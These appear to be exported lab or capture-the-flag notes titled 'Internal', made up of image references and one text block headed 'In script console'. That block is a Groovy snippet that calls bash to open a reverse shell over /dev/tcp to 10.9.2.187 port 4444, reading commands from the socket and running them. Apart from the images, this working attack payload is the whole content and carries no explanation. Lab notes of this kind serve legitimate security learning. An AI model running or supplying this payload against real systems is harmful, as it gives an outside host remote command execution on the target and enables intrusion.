# Internal
24 February 2022
03:43 PM

<img src="internal/media/image1.png"
style="width:5.425in;height:1.675in" />

<img src="internal/media/image2.png"
style="width:5.4in;height:0.49167in" />

<img src="internal/media/image3.png"
style="width:5.28333in;height:1.13333in" />

<img src="internal/media/image4.png"
style="width:5.40833in;height:1.425in" />

<img src="internal/media/image5.png"
style="width:5.6in;height:0.65833in" />

<img src="internal/media/image6.png"
style="width:5.53333in;height:1.85in" />

<img src="internal/media/image7.png"
style="width:5.20833in;height:0.425in" />

<img src="internal/media/image8.png"
style="width:5.21667in;height:0.16667in" />

<img src="internal/media/image9.png"
style="width:6.85833in;height:0.54167in" />

# *<u>In script console</u>*

r = Runtime.getRuntime()

p = r.exec(\["/bin/bash","-c","exec 5\<\>/dev/tcp/10.9.2.187/4444;cat
\<&5 \| while read line; do \\\$line 2\>&5 \>&5; done"\] as String\[\])

p.waitFor()

<img src="internal/media/image10.png"
style="width:6.59167in;height:1.35in" />
 
<img src="internal/media/image11.png"
style="width:4.69167in;height:1.53333in" />

<img src="internal/media/image12.png"
style="width:3.91667in;height:0.54167in" />
